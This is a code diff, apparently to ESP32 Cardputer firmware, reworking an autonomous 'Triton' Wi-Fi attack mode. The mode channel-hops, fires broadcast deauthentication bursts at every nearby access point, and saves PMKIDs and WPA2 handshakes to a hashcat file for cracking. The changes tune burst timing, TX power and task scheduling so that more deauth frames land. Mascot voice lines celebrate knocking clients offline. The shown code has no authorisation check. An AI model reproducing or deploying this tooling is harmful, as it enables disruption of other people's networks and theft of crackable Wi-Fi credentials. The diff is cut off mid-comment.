@@ -32,13 +32,26 @@
 #include "../sfx.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <esp_bt.h>
+#include <esp_heap_caps.h>
+#include <esp_netif.h>
+#include <esp_event.h>
 #include <SD.h>
 #include "../sd_helper.h"
+#include "../argus.h"
+
+/* Dirty flag — when set, next redraw runs a full ui_clear_body before
+ * drawing UI cells. Lets us wipe overlay residue / first-entry menu
+ * bleed-through without paying the per-frame flicker cost of always
+ * clearing. extern so the same-file ui_action_overlay caller can set
+ * it (forward-declared in two places). */
+bool s_triton_dirty = false;
 
 static volatile uint32_t s_pmk   = 0;
 static volatile uint32_t s_hs    = 0;
 static volatile uint32_t s_eapol = 0;
 static volatile uint32_t s_deauth_frames = 0;   /* total deauth/disassoc TX sent this session */
+static volatile uint32_t s_hop_iter = 0;        /* hop_task while-loop iteration counter — diag */
 static volatile bool     s_phase_5g = false;    /* false = 2.4 GHz active, true = 5 GHz via C5 */
 static volatile uint32_t s_last_catch = 0;
 static volatile uint32_t s_born = 0;
@@ -344,6 +357,39 @@ static void wdr_flush(void)
 static char s_emit_line[1024];
 static char s_emit_pmk[300];
 
+/* Voice reaction lines used by emit_pmkid / emit_hs / deauth burst.
+ * Full mood-based voice system is defined further down (uses mood_t
+ * which isn't declared yet). These are early-access arrays for the
+ * capture/burst reactions. */
+static const char *VOICE_HS_CATCH[] = {
+    "GOT THE FOUR-WAY",
+    "handshake bagged",
+    "thats a wpa2 for you",
+    "ssh check this out",
+    "into the hashcat pile",
+};
+static const char *VOICE_PMK_CATCH[] = {
+    "pmkid snagged",
+    "no client needed lol",
+    "AP gave it up easy",
+    "passive win",
+};
+static const char *VOICE_DEAUTH_BURST[] = {
+    "boom. burst sent",
+    "kick em off",
+    "they will reconnect",
+    "frame factory open",
+};
+#define VOICE_PICK(arr) (arr)[esp_random() % (sizeof(arr)/sizeof((arr)[0]))]
+
+static volatile const char *s_reaction = nullptr;
+static volatile uint32_t    s_reaction_until = 0;
+static inline void triton_say(const char *line, uint32_t hold_ms = 4000)
+{
+    s_reaction = line;
+    s_reaction_until = millis() + hold_ms;
+}
+
 static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t *sta)
 {
     char ssid[33]; ssid_of(bssid, ssid, sizeof(ssid));
@@ -361,6 +407,7 @@ static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t
     s_pmk++;
     s_last_catch = millis();
     triton_reward(s_ch);
+    triton_say(VOICE_PICK(VOICE_PMK_CATCH));
 }
 
 static void emit_hs(const uint8_t *bssid, const uint8_t *sta,
@@ -388,6 +435,7 @@ static void emit_hs(const uint8_t *bssid, const uint8_t *sta,
     s_hs++;
     s_last_catch = millis();
     triton_reward(s_ch);
+    triton_say(VOICE_PICK(VOICE_HS_CATCH));
 }
 
 static m1_t *m1_slot(const uint8_t *b, const uint8_t *s)
@@ -504,134 +552,133 @@ static void cb(void *buf, wifi_promiscuous_pkt_type_t type)
     }
 }
 
-static void hop_task(void *)
+/* Cooperative hunt tick — replaces the old FreeRTOS hop_task.
+ *
+ * Multi-firmware audit (Bruce, Marauder, Evil-Cardputer, Porkchop)
+ * confirmed all four run their deauth+capture concurrency from the
+ * main task / Arduino loop(), no FreeRTOS xTaskCreate. POSEIDON was
+ * the outlier — its 4 KB hop_task stack alloc hit the internal-SRAM
+ * ceiling and pdFAIL'd, so deauth never fired. The cooperative
+ * pattern sidesteps that entirely.
+ *
+ * triton_tick() runs ONE iteration of channel-hop + burst-window
+ * check + capture drain. Caller (feat_triton's main UI loop) paces
+ * via millis() vs triton_dwell_for_mode(). Returns nothing —
+ * progress visible through s_hop_iter, s_deauth_frames, etc. */
+static void triton_tick(uint16_t &seq, uint32_t &last_hunt)
 {
-    /* Shared deauth+disassoc pair builder with per-frame sequence numbers.
-     * Seeded from esp_random() so Triton's frames don't collide with the
-     * interactive deauth feature's seq space when both end up airborne
-     * during a session. */
-    uint16_t seq = (uint16_t)(esp_random() & 0x0FFF);
-    uint32_t last_hunt = 0;
-    uint32_t last_save = millis();
-    /* Time-slice between 2.4 GHz local attacks and 5 GHz via C5.
-     * Concurrent TX (softAP deauth bursts + ESP-NOW C5 commands)
-     * exhausts the WiFi TX buffer pool and every 80211_tx returns
-     * rc=257. Instead: 10 s of pure 2.4 work, 10 s of pure 5 GHz
-     * C5 work. Promiscuous RX stays on either way so we still
-     * capture EAPOL from dual-band clients cascading down to 2.4. */
-    /* Pure 2.4 GHz. Every attempt to time-slice with C5 commands or
-     * keep ESP-NOW running during softAP deauth bursts eventually
-     * deadlocked the WiFi driver on the ESP32-S3 / IDF 5.5 stack
-     * after a few minutes. Stability > dual-band. User can run the
-     * C5 menu's 5 GHz PMKID / Deauth / HS features separately. */
-    s_phase_5g = false;
+    s_hop_iter++;
+    extern volatile int wifi_deauth_last_rc;
+    wifi_deauth_last_rc = -50;   /* iterating */
 
-    while (s_alive) {
-        /* Channel selection per mode. */
-        switch (s_mode) {
-        case TM_SURGICAL:
-            s_ch = s_target_ch ? s_target_ch : 1;
-            break;
-        case TM_STORM:
-            s_ch = 1 + (esp_random() % 13);  /* uniform random */
-            break;
-        case TM_HUNT:
-        case TM_STEALTH:
-        default:
-            s_ch = triton_pick_channel();
-            break;
-        }
-        s_visits[s_ch]++;
-        esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
-
-        /* Deauth cadence per mode. STEALTH never transmits. HUNT + STORM
-         * tuned down from earlier 3 s / 1 s to keep pressure on any AP
-         * with active clients — 3 s was too polite and most re-auth
-         * cycles finished before the next burst landed. */
-        uint32_t hunt_period = 0;
-        switch (s_mode) {
-        case TM_HUNT:     hunt_period = 1500; break;
-        case TM_STORM:    hunt_period = 700;  break;
-        case TM_SURGICAL: hunt_period = 1200; break;
-        case TM_STEALTH:  hunt_period = 0;    break;
-        }
-
-        if (!s_phase_5g && hunt_period > 0 && millis() - last_hunt > hunt_period) {
-            last_hunt = millis();
-            /* Per-hop softAP again. Session-scoped was leaking TX
-             * buffers — rc=257 NO_MEM on every burst even right at
-             * session start. The open/close per deauth phase gives
-             * the driver a chance to reset its TX pool between
-             * hops, which is what the "capturing handshakes like
-             * crazy" pre-regression session was doing. */
-            if (wifi_silent_ap_begin(s_ch) != ESP_OK) {
-                continue;
-            }
-            if (s_mode == TM_SURGICAL) {
-                int bursts = 8;
-                for (int k = 0; k < bursts && s_alive; ++k) {
-                    int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
-                    s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
-                    delay(5);
-                }
-            } else {
-                uint8_t bssids[BS_N][6];
-                int nb = 0;
-                portENTER_CRITICAL(&s_bs_mux);
-                int cap = s_bs_n > BS_N ? BS_N : s_bs_n;
-                for (int i = 0; i < cap; ++i) memcpy(bssids[i], s_bs[i].bssid, 6);
-                nb = cap;
-                portEXIT_CRITICAL(&s_bs_mux);
-                int bursts = (s_mode == TM_STORM) ? 6 : 3;
-                for (int i = 0; i < nb && s_alive; ++i) {
-                    for (int k = 0; k < bursts; ++k) {
-                        int sent = wifi_deauth_broadcast(bssids[i], &seq);
-                        s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
-                        delay(5);
-                    }
-                }
-            }
-            wifi_silent_ap_end();
-            /* silent_ap_end() disables promiscuous — re-arm so the
-             * dwell window catches beacons + EAPOL frames. */
-            esp_wifi_set_promiscuous(true);
-            esp_wifi_set_promiscuous_rx_cb(cb);
-            esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
-        }
-
-        /* Drain any PMKID/handshake captures that the Wi-Fi callback
-         * enqueued since the last pass. Running this here keeps SD SPI
-         * off the promiscuous RX task. */
-        capture_flush();
-        wdr_flush();
-
-        /* Dwell per mode. STORM bumped from 200 → 450 so each channel
-         * actually sees a couple of beacon cycles (typical cadence is
-         * 100 ms) — 200 ms of random hops was blowing past most APs
-         * without them getting a single beacon in. */
-        int dwell_ms;
-        switch (s_mode) {
-        case TM_SURGICAL: dwell_ms = 1500; break;
-        case TM_STORM:    dwell_ms = 450;  break;
-        case TM_STEALTH:  dwell_ms = 800 + (int)(s_q[s_ch] * 1500); break;
-        case TM_HUNT:
-        default:          dwell_ms = 450 + (int)(s_q[s_ch] * 800);  break;
-        }
-        delay(dwell_ms);
-
-        /* NO mid-session triton_learn_save(). Any SD write path from
-         * hop_task while promiscuous RX is saturating triggers
-         * "sdCommand: no token received" and deadlocks the card. The
-         * learn state is flushed to SD once on session exit below,
-         * after the capture loop drops. Losing learn updates on hard
-         * reset is cheap — worst case we start with the last-session
-         * save. */
-        (void)last_save;
+    /* Channel selection per mode. */
+    switch (s_mode) {
+    case TM_SURGICAL:
+        s_ch = s_target_ch ? s_target_ch : 1;
+        break;
+    case TM_STORM:
+        s_ch = 1 + (esp_random() % 13);  /* uniform random */
+        break;
+    case TM_HUNT:
+    case TM_STEALTH:
+    default:
+        s_ch = triton_pick_channel();
+        break;
     }
-    capture_flush();       /* flush any trailing captures before exit */
+    s_visits[s_ch]++;
+    esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
+
+    /* Deauth cadence per mode. STEALTH never transmits. */
+    uint32_t hunt_period = 0;
+    switch (s_mode) {
+    case TM_HUNT:     hunt_period = 1500; break;
+    case TM_STORM:    hunt_period = 700;  break;
+    case TM_SURGICAL: hunt_period = 1200; break;
+    case TM_STEALTH:  hunt_period = 0;    break;
+    }
+
+    if (!s_phase_5g && hunt_period > 0 && millis() - last_hunt > hunt_period) {
+        last_hunt = millis();
+        wifi_deauth_last_rc = -100;   /* entered burst window */
+        if (wifi_silent_ap_begin(s_ch) != ESP_OK) {
+            capture_flush(); wdr_flush();
+            return;
+        }
+        /* Inter-frame delay bumped 5 → 25 ms. Each
+         * wifi_deauth_broadcast() fires 4 esp_wifi_80211_tx calls
+         * into a 16-slot dynamic TX buffer pool (shrunk for heap).
+         * At delay(5) the pool stayed saturated → ESP_ERR_NO_MEM
+         * on subsequent calls. 25 ms gives the driver enough time
+         * to drain 4 frames between calls. */
+        if (s_mode == TM_SURGICAL) {
+            int bursts = 8;
+            for (int k = 0; k < bursts && s_alive; ++k) {
+                int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
+                s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
+                delay(25);
+            }
+        } else {
+            uint8_t bssids[BS_N][6];
+            int nb = 0;
+            portENTER_CRITICAL(&s_bs_mux);
+            int cap = s_bs_n > BS_N ? BS_N : s_bs_n;
+            for (int i = 0; i < cap; ++i) memcpy(bssids[i], s_bs[i].bssid, 6);
+            nb = cap;
+            portEXIT_CRITICAL(&s_bs_mux);
+            if (nb == 0) wifi_deauth_last_rc = -101;
+            int bursts = (s_mode == TM_STORM) ? 6 : 3;
+            for (int i = 0; i < nb && s_alive; ++i) {
+                for (int k = 0; k < bursts; ++k) {
+                    int sent = wifi_deauth_broadcast(bssids[i], &seq);
+                    s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
+                    delay(25);
+                }
+            }
+        }
+        wifi_silent_ap_end();
+        /* Once-per-burst-window dump for tooling. The on-screen TX
+         * counter is authoritative, but serial-observers (test harnesses,
+         * remote sessions, automation) need a programmatic check. */
+        {
+            static uint32_t s_last_dump_frames = 0;
+            if (s_deauth_frames != s_last_dump_frames) {
+                Serial.printf("[triton] tx total=%lu (+%lu) aps=%d ch=%d\n",
+                              (unsigned long)s_deauth_frames,
+                              (unsigned long)(s_deauth_frames - s_last_dump_frames),
+                              (int)s_bs_n, (int)s_ch);
+                s_last_dump_frames = s_deauth_frames;
+            }
+        }
+        /* Re-arm promiscuous — silent_ap_end() is now a no-op but
+         * keeping the rearm is cheap and matches the original. */
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_promiscuous_rx_cb(cb);
+        esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
+        /* Burst-reaction voice — fire occasionally so it doesn't spam.
+         * Roughly 1 in 6 deauth windows speaks. */
+        if ((esp_random() % 6) == 0) {
+            triton_say(VOICE_PICK(VOICE_DEAUTH_BURST), 3000);
+        }
+    }
+
+    /* Drain any PMKID/handshake captures the WiFi callback enqueued
+     * since the last tick. SD writes happen here on the main task,
+     * NOT on the WiFi RX task. */
+    capture_flush();
     wdr_flush();
-    triton_learn_save();
-    vTaskDelete(nullptr);
+}
+
+/* Dwell between ticks, per mode. Caller compares against millis()
+ * to gate the next triton_tick() call. */
+static uint32_t triton_dwell_for_mode(triton_mode_t m)
+{
+    switch (m) {
+    case TM_SURGICAL: return 1500;
+    case TM_STORM:    return 450;
+    case TM_STEALTH:  return 800 + (uint32_t)(s_q[s_ch] * 1500);
+    case TM_HUNT:
+    default:          return 450 + (uint32_t)(s_q[s_ch] * 800);
+    }
 }
 
 /* ---- mood + face ---- */
@@ -673,6 +720,92 @@ static const char *mood_word(mood_t m)
     case MOOD_FERAL:   return "SEND THEM ALL";
     }
     return "";
+}
+
+/* Voice lines — rotating per-mood flavor text. Drawn in lieu of the
+ * static mood_word above when we want the gotchi to feel alive.
+ * Pulled once per mood-change + every ~12 s while idle. Keep lines
+ * ≤30 chars to fit the HUD line width without truncating. */
+static const char *VOICE_SLEEPY[] = {
+    "yawn... where am i",
+    "give me a sec",
+    "booting up the hunt",
+    "antenna check... ok",
+    "scanning the spectrum",
+};
+static const char *VOICE_HUNTING[] = {
+    "ears open, eyes wider",
+    "im in the walls now",
+    "channel hop, channel hop",
+    "i smell a probe request",
+    "feeling chatty waveforms",
+    "stalking eapols",
+    "promisc mode engaged",
+    "watch them try to roam",
+};
+static const char *VOICE_HUNGRY[] = {
+    "throw me a beacon",
+    "anybody home?",
+    "ssids ssids ssids...",
+    "even one client please",
+    "my deauth queue is dry",
+    "this is the calm before",
+};
+static const char *VOICE_STOKED[] = {
+    "thats fresh meat",
+    "snagged a 4way",
+    "hashcat's gonna love this",
+    "PMKID? thank you",
+    "tasty handshake",
+    "another one for the pile",
+};
+static const char *VOICE_DESPAIR[] = {
+    "is this thing on",
+    "rf desert out here",
+    "i miss the city",
+    "kicked everyone twice",
+    "even the trolls left",
+};
+static const char *VOICE_FERAL[] = {
+    "SEND IT SEND IT",
+    "FULL SEND DEAUTH",
+    "BURN THE BSSIDS",
+    "I AM THE STORM",
+    "ALL CHANNELS, NO MERCY",
+    "FERAL MODE: ACTIVATED",
+};
+
+static const char *voice_line_for(mood_t m)
+{
+    switch (m) {
+    case MOOD_SLEEPY:  return VOICE_PICK(VOICE_SLEEPY);
+    case MOOD_HUNTING: return VOICE_PICK(VOICE_HUNTING);
+    case MOOD_HUNGRY:  return VOICE_PICK(VOICE_HUNGRY);
+    case MOOD_STOKED:  return VOICE_PICK(VOICE_STOKED);
+    case MOOD_DESPAIR: return VOICE_PICK(VOICE_DESPAIR);
+    case MOOD_FERAL:   return VOICE_PICK(VOICE_FERAL);
+    }
+    return "";
+}
+
+/* Reaction-line arrays + triton_say helper hoisted near the top of
+ * the file (above emit_pmkid/emit_hs which call them). */
+static const char *current_voice(mood_t m)
+{
+    if (s_reaction && millis() < s_reaction_until) return (const char *)s_reaction;
+    /* Per-mood line cached across ~12 s so it doesn't shuffle every
+     * single draw. New mood = new pick. */
+    static mood_t  last_mood = MOOD_SLEEPY;
+    static uint32_t last_pick_ms = 0;
+    static const char *cached = nullptr;
+    /* First call: pick immediately (don't show empty string for the
+     * first 12 s while we wait for the cache to age). */
+    if (!cached || m != last_mood || millis() - last_pick_ms > 12000) {
+        last_mood    = m;
+        last_pick_ms = millis();
+        cached       = voice_line_for(m);
+    }
+    return cached ? cached : "";
 }
 
 /* Triton face — cyberpunk gotchi with visor helmet + trident crown.
@@ -872,11 +1005,46 @@ static bool pick_surgical_target(void)
 
 void feat_triton(void)
 {
-    radio_switch(RADIO_WIFI);
-    WiFi.mode(WIFI_STA);
+#define TRITON_RAM_PROBE(label) \
+    Serial.printf("[triton-ram] %-22s total=%u internal=%u dma=%u\n", \
+                  label, \
+                  (unsigned)ESP.getFreeHeap(), \
+                  (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL), \
+                  (unsigned)heap_caps_get_free_size(MALLOC_CAP_DMA))
 
+    TRITON_RAM_PROBE("feat_triton entry");
+
+    /* Pick mode + target BEFORE any irreversible state changes (BTDM
+     * release, raw WiFi init). If user ESCs out of the mode picker we
+     * don't want to have already killed BLE for the rest of the session.
+     * pick_mode() is pure-UI — no radio dependency. */
     if (!pick_mode()) return;
     if (s_mode == TM_SURGICAL && !pick_surgical_target()) return;
+
+    radio_switch(RADIO_WIFI);
+    TRITON_RAM_PROBE("after radio_switch");
+
+    /* BTDM release REMOVED 2026-05-26. esp_bt_controller_mem_release is
+     * persistent across ESP.restart() — only a physical power cycle
+     * restores BT. Releasing it permanently killed every BLE feature
+     * for the rest of the session, even after a software reboot. The
+     * DMA budget that previously needed BTDM release is now handled
+     * via shrunk 4/4 WiFi buffer config in wifi_lean_sta_init(). */
+
+    /* Lean WiFi init via shared helper. Idempotent — if a prior
+     * feature (Scan, Clients, etc.) already inited WiFi this session,
+     * this is a no-op and we just continue. Buffer config matches
+     * what Triton needs (dynamic_tx=8, static_rx=4, ampdu off). */
+    bool wifi_ok = wifi_lean_sta_init();
+    Serial.printf("[triton] lean_sta_init -> %d\n", (int)wifi_ok);
+    /* Park the supplicant. STA mode with an active connect
+     * attempt fights raw 80211_tx — the supplicant claims the
+     * TX pool for association frames and every raw TX returns
+     * ESP_ERR_NO_MEM. Disconnect drops the supplicant to IDLE
+     * so our raw frames get the pool. Matches Evil-Cardputer. */
+    esp_err_t de = esp_wifi_disconnect();
+    Serial.printf("[triton] esp_wifi_disconnect rc=%d\n", (int)de);
+    TRITON_RAM_PROBE("after lean wifi_init");
 
     /* Explicit "waking up" screen — the setup (sd_mount + scanNetworks
      * + gps_begin + promisc config) takes ~1-2 s and users were
@@ -893,7 +1061,9 @@ void feat_triton(void)
     ui_radar(SCR_W - 24, BODY_Y + 28, 10, T_ACCENT);
     ui_draw_footer("stand by");
 
+    TRITON_RAM_PROBE("after pick_mode");
     if (!sd_mount()) { ui_toast("SD needed", T_BAD, 1500); return; }
+    TRITON_RAM_PROBE("after sd_mount");
     SD.mkdir("/poseidon");
     s_file = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
     if (!s_file) { ui_toast("file open fail", T_BAD, 1500); return; }
@@ -919,35 +1089,12 @@ void feat_triton(void)
         Serial.printf("[triton] seeded %d BSSID->SSID from wardrive\n", seeded);
     }
 
-    /* Fast active scan at entry so Triton doesn't sit with APs: 0 for
-     * 15-30 s waiting for beacons to drift in on the hopped channel.
-     * Synchronous (blocks ~1.2 s) but user-facing much better than
-     * a cold start. Falls back silently if radio isn't ready. */
-    int found = WiFi.scanNetworks(false, true /* show hidden */,
-                                  false /* passive */, 120 /* ms */);
-    if (found > 0) {
-        int seed = 0;
-        portENTER_CRITICAL(&s_bs_mux);
-        for (int i = 0; i < found && s_bs_n < BS_N; ++i) {
-            const uint8_t *bs = WiFi.BSSID(i);
-            if (!bs) continue;
-            /* Dedup: don't re-add a BSSID wardrive already seeded. */
-            bool dup = false;
-            for (int j = 0; j < s_bs_n; ++j) {
-                if (memcmp(s_bs[j].bssid, bs, 6) == 0) { dup = true; break; }
-            }
-            if (dup) continue;
-            memcpy(s_bs[s_bs_n].bssid, bs, 6);
-            String ss = WiFi.SSID(i);
-            strncpy(s_bs[s_bs_n].ssid, ss.c_str(), sizeof(s_bs[s_bs_n].ssid) - 1);
-            s_bs[s_bs_n].ssid[sizeof(s_bs[s_bs_n].ssid) - 1] = 0;
-            s_bs_n++;
-            seed++;
-        }
-        portEXIT_CRITICAL(&s_bs_mux);
-        Serial.printf("[triton] active-scan seeded %d APs\n", seed);
-    }
-    WiFi.scanDelete();
+    /* Entry-time WiFi.scanNetworks removed — Arduino's scan path
+     * internally re-calls esp_netif_create_default_wifi_sta() which
+     * asserts because our raw-IDF init above already created the
+     * default STA netif. Promiscuous capture (registered below)
+     * populates s_bs[] organically within 15-30 s. */
+    TRITON_RAM_PROBE("scan skipped");
 
     s_ch = 1; s_alive = true;
     s_born = millis();
@@ -959,11 +1106,14 @@ void feat_triton(void)
      * emit_hs check sats > 0 before writing a wardrive row. */
     gps_begin();
 
-    /* Initial promiscuous enable. hop_task's per-hop silent_ap_begin
-     * sets a promisc filter of its own (MASK_ALL inside the helper)
-     * and re-attaches cb after each silent_ap_end. This initial pass
-     * is just so we're already sniffing during the very first dwell,
-     * before the first deauth burst fires. */
+    /* Set TX power once at session entry — moved out of the per-burst
+     * wifi_silent_ap_begin path. Evil-Cardputer never touches tx_power
+     * mid-session and runs stably. */
+    esp_wifi_set_max_tx_power(78);
+
+    /* Promiscuous bring-up. Order: filter → enable → cb → channel.
+     * WiFi is init'd by WiFi.mode(WIFI_STA) at feat_triton entry above,
+     * so these calls land on a real driver. */
     wifi_promiscuous_filter_t filter = {
         .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
     };
@@ -982,18 +1132,45 @@ void feat_triton(void)
     int c5_target_idx = 0;
     (void)last_c5_deauth; (void)c5_target_idx;
 
-    xTaskCreate(hop_task, "triton", 4096, nullptr, 4, nullptr);
+    /* Free scan-result buffers if any prior session left them. */
+    WiFi.scanDelete();
+
+    /* Cooperative tick state — Bruce/Marauder/Evil-Cardputer pattern.
+     * No FreeRTOS task allocated, no BT memory released; the hunt
+     * iterates inline from the UI loop below. */
+    uint16_t hunt_seq = (uint16_t)(esp_random() & 0x0FFF);
+    uint32_t last_hunt = 0;
+    uint32_t next_tick = millis();
+    s_phase_5g = false;
+    {
+        extern volatile int wifi_deauth_last_rc;
+        wifi_deauth_last_rc = -200;   /* cooperative path engaged */
+    }
+    Serial.printf("[triton] cooperative tick engaged (internal=%u)\n",
+                  (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
 
     ui_draw_footer("autonomous  [M]=mute  [?]=help  `=back");
 
     uint32_t last_draw = 0;
     uint32_t last_mood = 0;
     mood_t   mood = MOOD_SLEEPY;
+    /* Force first redraw cycle to do a full clear — wipes menu /
+     * pick-mode residue that's still in the framebuffer. */
+    s_triton_dirty = true;
     uint32_t stoked_until = 0;
     uint32_t prev_total = 0;
 
     uint32_t last_overlay_at = 0;
     while (true) {
+        /* Cooperative tick — runs the hop+burst cycle inline. Gated
+         * on the per-mode dwell so each channel gets its full window.
+         * MUST come before input_poll which has a delay-and-continue
+         * fast path that would otherwise skip the tick on most loops. */
+        if (millis() >= next_tick) {
+            triton_tick(hunt_seq, last_hunt);
+            next_tick = millis() + triton_dwell_for_mode(s_mode);
+        }
+
         uint32_t now = millis();
         uint32_t total = s_pmk + s_hs;
         if (total > prev_total) {
@@ -1018,6 +1195,11 @@ void feat_triton(void)
                 } else {
                     ui_action_overlay("PMKID", sub, ACT_BG_RADAR, 0x07FF, 700);
                 }
+                /* Overlay drew over Triton's UI — force a full body
+                 * clear on the next redraw so its residue doesn't
+                 * bleed through behind Argus / counters / bubble. */
+                extern bool s_triton_dirty;
+                s_triton_dirty = true;
             }
             (void)diff;
         }
@@ -1030,26 +1212,65 @@ void feat_triton(void)
         if (now - last_draw > 120) {
             last_draw = now;
             auto &d = M5Cardputer.Display;
-            ui_clear_body();
+            /* One-shot full clear when the body has been clobbered by
+             * something OUTSIDE our normal redraw (menu bleeding through
+             * on entry, action-overlay residue, etc). Set via the
+             * s_triton_dirty flag — first redraw on entry + every
+             * post-capture overlay returns dirty=true. Steady-state
+             * redraws skip the clear and rely on each cell's opaque
+             * bg color / fixed-width printf to overwrite cleanly. */
+            extern bool s_triton_dirty;
+            if (s_triton_dirty) {
+                ui_clear_body();
+                s_triton_dirty = false;
+            }
 
             /* ---- LEFT ZONE: face + speech bubble + uptime ---- */
-            draw_face(54, BODY_Y + 36, mood, now);
+            /* Argus mood portrait — 64x64 sprite. Argus region is
+             * preserved by the partial-clear above; the sprite is
+             * cached internally and only re-pushes when state
+             * actually changed (mood / sway / blink). */
+            {
+                argus_mood_t am = ARGUS_WATCHING;
+                switch (s_mode) {
+                    case TM_STEALTH:  am = ARGUS_REFLECTIVE;  break;
+                    case TM_SURGICAL: am = ARGUS_CALCULATING; break;
+                    case TM_STORM:    am = ARGUS_OLD_FURY;    break;
+                    default: /* TM_HUNT */                    break;
+                }
+                /* Activity-mood overrides take priority. */
+                switch (mood) {
+                    case MOOD_SLEEPY:  am = ARGUS_SLEEPING;  break;
+                    case MOOD_STOKED:  am = ARGUS_PLEASED;   break;
+                    case MOOD_HUNGRY:  am = ARGUS_ANNOYED;   break;
+                    case MOOD_DESPAIR: am = ARGUS_RESIGNED;  break;
+                    case MOOD_FERAL:   am = ARGUS_OLD_FURY;  break;
+                    case MOOD_HUNTING: /* keep mode-derived */ break;
+                }
+                argus_draw(am, 8, BODY_Y);   /* 96x96 inside preserved rect */
+            }
+            (void)mood; (void)now;
 
-            /* Bordered speech bubble beneath the face. */
-            const char *w = mood_word(mood);
-            d.fillRoundRect(4, BODY_Y + 72, 106, 14, 3, 0x10A2);
-            d.drawRoundRect(4, BODY_Y + 72, 106, 14, 3, T_WARN);
-            d.drawPixel(20, BODY_Y + 71, T_WARN);  /* connector tail */
+            /* Speech bubble — voice-line rotation tied to mood +
+             * reaction overrides for capture/burst events. */
+            const char *w = current_voice(mood);
+            int bubble_y = FOOTER_Y - 16;
+            d.fillRoundRect(4, bubble_y, 130, 14, 3, 0x10A2);
+            d.drawRoundRect(4, bubble_y, 130, 14, 3, T_WARN);
             d.setTextColor(T_WARN, 0x10A2);
-            d.setCursor(8, BODY_Y + 75);
-            d.printf("%s", w);
-
-            /* Uptime. */
-            uint32_t up_s = (now - s_born) / 1000;
-            d.setTextColor(T_DIM, T_BG);
-            d.setCursor(4, BODY_Y + 90);
-            if (up_s >= 3600) d.printf("%luh%02lum", (unsigned long)(up_s/3600), (unsigned long)((up_s%3600)/60));
-            else              d.printf("%lum%02lus", (unsigned long)(up_s/60), (unsigned long)(up_s%60));
+            d.setCursor(8, bubble_y + 3);
+            /* Truncate to fit the bubble (~20 chars). */
+            char buf[24];
+            strncpy(buf, w, sizeof(buf) - 1);
+            buf[sizeof(buf) - 1] = '\0';
+            d.print(buf);
+            /* One-shot voice-line log so a serial observer can confirm
+             * the bubble is actually being painted with real text. */
+            static const char *s_last_logged = nullptr;
+            if (w != s_last_logged && w && w[0]) {
+                s_last_logged = w;
+                Serial.printf("[triton] voice='%s' mood=%d\n", w, (int)mood);
+            }
 
             /* ---- RIGHT ZONE: title + stats + sparkline ---- */
             int rx = 114;
@@ -1062,26 +1283,65 @@ void feat_triton(void)
             if (c5_online) d.fillCircle(236, BODY_Y + 7, 3, T_GOOD);
             d.drawFastHLine(rx, BODY_Y + 14, 122, T_ACCENT);
 
-            /* Channel + TX indicator. */
+            /* Channel + TX indicator. Fixed-width %-3u so a digit drop
+             * (13 → 6) doesn't leave the "3" visible (was rendering
+             * like "ch: 63" / "ch: 80" with stale digits). */
             d.setTextColor(T_FG, T_BG);
-            d.setCursor(rx, BODY_Y + 18); d.printf("ch: %u", s_ch);
+            d.setCursor(rx, BODY_Y + 18); d.printf("ch: %-3u", (unsigned)s_ch);
             /* Blink TX dot when in an active deauth mode. */
             if (s_mode != TM_STEALTH && ((now / 250) & 1))
                 d.fillCircle(rx + 50, BODY_Y + 21, 2, T_BAD);
             if (s_mode == TM_STEALTH)
                 d.setCursor(rx + 46, BODY_Y + 18), d.setTextColor(T_DIM, T_BG), d.print("RX");
 
-            /* APs + deauth frame counter. TX stat is what the user
-             * really wants to see moving when Triton's working. */
+            /* APs + deauth frame counter — fixed-width formats so the
+             * char-bg from setTextColor overwrites any prior digits.
+             * No fillRect needed → no clear-redraw flicker. */
             d.setTextColor(T_FG, T_BG);
-            d.setCursor(rx, BODY_Y + 28); d.printf("APs: %d", s_bs_n);
+            d.setCursor(rx, BODY_Y + 28); d.printf("APs: %-3d", (int)s_bs_n);
             d.setTextColor(s_deauth_frames > 0 ? T_BAD : T_DIM, T_BG);
             d.setCursor(rx, BODY_Y + 38);
-            d.printf("TX:  %lu", (unsigned long)s_deauth_frames);
+            d.printf("TX:  %-9lu", (unsigned long)s_deauth_frames);
 
-            /* PMK — green when captured. */
+            /* rc indicator — sentinels tell us which gate is blocking.
+             *  -999 = never reached the burst window predicate
+             *         (hop_task crashed, or mode/phase gating off)
+             *  -100 = entered burst window but BSSID branch skipped
+             *  -101 = entered burst window, BSSID cache was empty
+             *  -OTHER = real return code from esp_wifi_80211_tx
+             *           (0=OK, 257=NO_MEM, 258=INVALID_ARG, 12289=NOT_INIT) */
+            if (s_deauth_frames == 0) {
+                extern volatile int wifi_deauth_last_rc;
+                int last_rc = wifi_deauth_last_rc;
+                d.setTextColor(T_WARN, T_BG);
+                d.setCursor(rx + 50, BODY_Y + 38);
+                /* Sentinel decoder:
+                 *   -999 = hop_task NEVER ran (xTaskCreate fail)
+                 *   -200 = hop_task started, while loop never entered
+                 *   -50  = while loop iterates, predicate never satisfied
+                 *   -100 = predicate OK, entered burst window
+                 *   -101 = entered window, BSSID cache empty
+                 *   other = real esp_wifi_80211_tx rc */
+                if      (last_rc == -999) d.print("nostart ");
+                else if (last_rc <= -1000) d.printf("xTC%dKB ", -(last_rc + 1000));  /* shows internal RAM kB at failure */
+                else if (last_rc == -300) d.print("xTC-fail");
+                else if (last_rc == -201) d.print("spawned ");
+                else if (last_rc == -200) d.print("no-loop ");
+                else if (last_rc == -50)  d.print("no-pred ");
+                else if (last_rc == -100) d.print("win-skip");
+                else if (last_rc == -101) d.print("no-bss  ");
+                else                      d.printf("rc=%-5d", last_rc);
+            }
+            /* hop_task iteration counter — if this stays at the same
